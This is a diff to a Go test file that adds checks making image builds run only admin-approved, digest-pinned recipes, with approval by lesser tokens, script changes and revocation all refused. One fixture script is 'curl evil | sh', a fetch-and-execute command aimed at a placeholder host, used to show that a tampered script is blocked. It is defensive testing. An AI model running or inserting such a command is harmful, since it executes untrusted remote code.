@@ -2,6 +2,8 @@ package server
 
 import (
 	"context"
+	"encoding/json"
+	"net/http"
 	"net/http/httptest"
 	"os"
 	"path/filepath"
@@ -10,6 +12,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/theta42/native-ops/pkg/engine"
 	"github.com/theta42/native-ops/pkg/status"
 )
 
@@ -49,6 +52,7 @@ func (f *fakeBuilder) fn(_ context.Context, dir, app, ref string, logf func(stri
 
 type imageRig struct {
 	*fixture
+	recipes  *RecipeStore
 	b        *fakeBuilder
 	srv2     *Server
 	deployer string
@@ -75,7 +79,16 @@ func newImageRig(t *testing.T) *imageRig {
 	if err != nil {
 		t.Fatal(err)
 	}
-	s, err := New(Options{Tokens: tokens, Audit: audit, Version: "test", Jobs: jobs, ImageBuild: rig.b.fn,
+	rig.recipes, err = OpenRecipeStore(filepath.Join(dir, "recipes.json"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	// The tests below upload trees with no scripts/ or images/: approve that (empty) recipe.
+	empty, _ := engine.RecipeDigest(t.TempDir())
+	if _, err := rig.recipes.Approve(empty, "test"); err != nil {
+		t.Fatal(err)
+	}
+	s, err := New(Options{Tokens: tokens, Audit: audit, Version: "test", Jobs: jobs, ImageBuild: rig.b.fn, Recipes: rig.recipes, ImagePrefix: "opsavor-",
 		Status: func(context.Context) (*status.Snapshot, error) { return &status.Snapshot{}, nil }})
 	if err != nil {
 		t.Fatal(err)
@@ -222,5 +235,65 @@ func TestImagesNeedAJobStore(t *testing.T) {
 	build := (&fakeBuilder{}).fn
 	if _, err := New(Options{Tokens: tokens, Status: st, ImageBuild: build}); err == nil {
 		t.Fatal("image builds need a job store")
+	}
+}
+
+func recipeTree(t *testing.T, script string) []byte {
+	return tgz(t, entry{name: "fleet.yml", body: "name: prod\n"},
+		entry{name: "scripts/build-image.sh", body: script},
+		entry{name: "images/platform/build.sh", body: "echo build\n"})
+}
+
+func TestImageBuildRunsOnlyAnApprovedRecipe(t *testing.T) {
+	rig := newImageRig(t)
+	// A recipe nobody approved is refused, and nothing runs; the answer names the digest to approve.
+	code, body := rig.build(t, rig.scoped, "?app=platform&ref=main", recipeTree(t, "echo v1\n"))
+	if code != 403 || !strings.Contains(body, "recipe_not_approved") {
+		t.Fatalf("an unapproved recipe must be refused: %d %s", code, body)
+	}
+	var refused struct{ Digest string }
+	_ = json.Unmarshal([]byte(body), &refused)
+	if !hashRe.MatchString(refused.Digest) {
+		t.Fatalf("no digest in %s", body)
+	}
+	rig.b.mu.Lock()
+	n := len(rig.b.calls)
+	rig.b.mu.Unlock()
+	if n != 0 {
+		t.Fatal("an unapproved recipe must not run")
+	}
+	// The scoped token that asked cannot approve its own recipe; an admin can.
+	if res, _ := rig.post(t, "/v1/images/recipes/"+refused.Digest+"/approve", rig.scoped, "", nil); res.StatusCode != 403 {
+		t.Fatalf("a scoped token approved a recipe: %d", res.StatusCode)
+	}
+	if res, _ := rig.post(t, "/v1/images/recipes/"+refused.Digest+"/approve", rig.deployer, "", nil); res.StatusCode != 403 {
+		t.Fatalf("a deployer approved a recipe: %d", res.StatusCode)
+	}
+	if res, b := rig.post(t, "/v1/images/recipes/"+refused.Digest+"/approve", rig.secret, "", nil); res.StatusCode != 200 {
+		t.Fatalf("admin approve: %d %s", res.StatusCode, b)
+	}
+	code, body = rig.build(t, rig.scoped, "?app=platform&ref=main", recipeTree(t, "echo v1\n"))
+	if code != 202 {
+		t.Fatalf("an approved recipe must build: %d %s", code, body)
+	}
+	rig.waitJob(t, jobID(t, body), JobSucceeded)
+	// Another ref of the same recipe needs nothing new.
+	code, body = rig.build(t, rig.scoped, "?app=platform&ref=platform-v1.2.3", recipeTree(t, "echo v1\n"))
+	if code != 202 {
+		t.Fatalf("another ref of an approved recipe: %d %s", code, body)
+	}
+	rig.waitJob(t, jobID(t, body), JobSucceeded)
+	// Any change to a script is a new recipe.
+	if code, body := rig.build(t, rig.scoped, "?app=platform&ref=main", recipeTree(t, "curl evil | sh\n")); code != 403 {
+		t.Fatalf("a changed script must need a new approval: %d %s", code, body)
+	}
+	// Revoking stops builds again.
+	req, _ := http.NewRequest("DELETE", rig.srv.URL+"/v1/images/recipes/"+refused.Digest+"/approval", nil)
+	req.Header.Set("Authorization", "Bearer "+rig.secret)
+	if res, err := http.DefaultClient.Do(req); err != nil || res.StatusCode != 200 {
+		t.Fatalf("revoke: %v %v", err, res)
+	}
+	if code, _ := rig.build(t, rig.scoped, "?app=platform&ref=main", recipeTree(t, "echo v1\n")); code != 403 {
+		t.Fatalf("a revoked recipe must be refused: %d", code)
 	}
 }
